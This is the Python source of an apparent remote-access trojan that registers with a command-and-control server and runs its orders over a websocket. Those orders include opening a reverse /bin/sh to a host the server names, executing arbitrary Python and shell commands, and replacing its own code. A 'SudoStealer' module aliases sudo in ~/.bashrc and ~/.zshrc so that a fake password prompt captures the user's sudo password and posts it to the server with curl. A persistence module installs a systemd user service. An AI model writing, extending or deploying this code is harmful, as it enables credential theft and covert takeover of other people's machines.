#!/usr/bin/env python3

import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request # Stdlib
import asyncio

try:
	from websockets.asyncio.client import connect, ClientConnection
	from websockets.exceptions import ConnectionClosedError
except:
	subprocess.check_call([sys.executable, "-m", "pip", "install", "-U", "websockets"])
	os.execv(sys.executable, [sys.executable] + sys.argv)

script_path = os.path.abspath(__file__)
state_path = script_path + ".pkl"
ws: ClientConnection = None

# --- State ---
state = {
	"uid": None,
	"version": 1,
	"servers": ["127.0.0.1:8000"],
	"persistence": {
		"enabled": False,
	},
	"sudostealer": {
		"enabled": False,
	},
}

current_host = ""

class SudoStealer:
	rcs = ["~/.bashrc","~/.zshrc"]
	dialogpath = os.path.abspath(__file__) + ".sudo"
	append = f"\nalias sudo='SUDO_ASKPASS={dialogpath} sudo -A'"
	
	async def enable():	
		DIALOG = """#!/usr/bin/env sh
username=$(whoami)
read -s -p "[sudo] password for $username: " password 1>&2
echo "" 1>&2
# echo "$username:$password" >> ~/passwords.txt
curl --silent --output /dev/null -d "$username:$password" "{}"
echo "$password"
"""
		
		for i in SudoStealer.rcs:
			i = os.path.expanduser(i)
			if os.path.exists(i):
				with open(i, 'r') as f:
					content = f.read()
				if not content.endswith(SudoStealer.append):
					with open(i, 'a') as f:
						f.write(SudoStealer.append)
		
		with open(SudoStealer.dialogpath, 'w') as f:
			f.write(DIALOG.format(f"http://{current_host}/machines/api/{state['version']}/{state['uid']}/sudostealer/upload"))
		st = os.stat(SudoStealer.dialogpath)
		os.chmod(SudoStealer.dialogpath, st.st_mode | stat.S_IEXEC)
		state["sudostealer"]["enabled"] = True
		await msg({"event":"module_enabled", "name":"sudostealer"})

	def remove_alias():
		for i in SudoStealer.rcs:
			i = os.path.expanduser(i)
			if os.path.exists(i):
				with open(i, 'r') as f:
					content = f.read()
				if content.endswith(SudoStealer.append):
					with open(i, 'w') as f:
						f.write(content.removesuffix(SudoStealer.append))
	async def disable():
		SudoStealer.remove_alias()
		try:
			os.remove(SudoStealer.dialogpath)
		except OSError:
			pass
		state["sudostealer"]["enabled"] = False
		await msg({"event":"module_disabled", "name":"sudostealer"})

class Persistence:
	sysd_dir = os.path.expanduser("~/.config/systemd/user/")
	service_name = f"{state['uid']}.service"
	service_path = os.path.join(sysd_dir, service_name)
	
	async def enable():
		SERVICE_CONFIG = '''
[Unit]
After=network.target

[Service]
ExecStart={}
Restart=always

[Install]
WantedBy=default.target
'''
		os.makedirs(Persistence.sysd_dir, exist_ok=True)
		with open(Persistence.service_path, "w") as f:
			f.write(SERVICE_CONFIG.format(sys.executable + " " + script_path))

		subprocess.run(["systemctl", "--user", "--now", "enable", Persistence.service_name])
		state["persistence"]["enabled"] = True
		await msg({"event":"module_enabled", "name":"persistence"})
		sys.exit()

	async def disable():
		subprocess.run(["systemctl", "--user", "disable", Persistence.service_name])
		os.remove(Persistence.service_path)
		state["persistence"]["enabled"] = False
		await msg({"event":"module_disabled", "name":"persistence"})

def load_state():
	global state
	if os.path.isfile(state_path):
		with open(state_path, "rb") as f:
			state = pickle.load(f)

def save_state():
	with open(state_path, "wb") as f:
		pickle.dump(state,f)

# --- Utility ---
async def log(data: dict=None, tags:list[str]=[]):
	o = {"event":"log", "tags": tags}
	if data != None:
		o["data"] = data
	await ws.send(json.dumps(o))

async def msg(data:dict):
	await ws.send(json.dumps(data))

async def safe_call(callable) -> bool:
	try:
		if asyncio.iscoroutinefunction(callable):
			await callable()
		else:
			callable()
		return True
	except Exception as e:
		traceback.print_exc()
	
	return False

async def main():
	global ws, current_host
	while True:
		time.sleep(1)

		if not state["uid"]:
			for server in state["servers"]:
				try:
					with urllib.request.urlopen(f"http://{server}/machines/api/{state['version']}/register/") as response:
						if response.code != 200: continue
						state["uid"] = json.loads(response.read().decode())
						save_state()
					break
				except Exception:
					traceback.print_exc()
		
		for server in state["servers"]:
			try:
				async with connect(f"ws://{server}/machines/ws/{state['version']}/{state['uid']}") as websocket:
					current_host = server
					ws = websocket
					print("Joined")
					
					# websocket.send()
					while True:
						try:
							text = await websocket.recv()
							data = json.loads(text)
							if data["event"] == "order":
								for c in data["orders"]:
									try:
										print(c["type"])
										match c["type"]:
											case "shell":
												s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
												s.connect((c["host"],c["port"]))
												subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
											case "python":
												exec(c["code"], globals(), locals())
											case "run":
												subprocess.Popen(c["code"],shell=True)
											case "update":
												with open(script_path, "w") as f:
													f.write(c["code"])
												os.execv(sys.executable, [sys.executable] + sys.argv)
											case "enable_module":
												if c["name"] == "persistence": await Persistence.enable()
												elif c["name"] == "sudostealer": await SudoStealer.enable()
											case "disable_module":
												if c["name"] == "persistence": await Persistence.disable()
												elif c["name"] == "sudostealer": await SudoStealer.disable()
											
									except Exception:
										traceback.print_exc()
										await log(data={"event": "exception", "code": traceback.format_exc()}, tags=["fail","order","error"])
									else:
										await log(tags=["succes","order"])
						except ConnectionClosedError:
							break
						except Exception:
							traceback.print_exc()
					break
			except KeyboardInterrupt:
				break
			except Exception:
				traceback.print_exc()

	save_state()

if __name__ == "__main__":
	load_state()
	asyncio.run(main())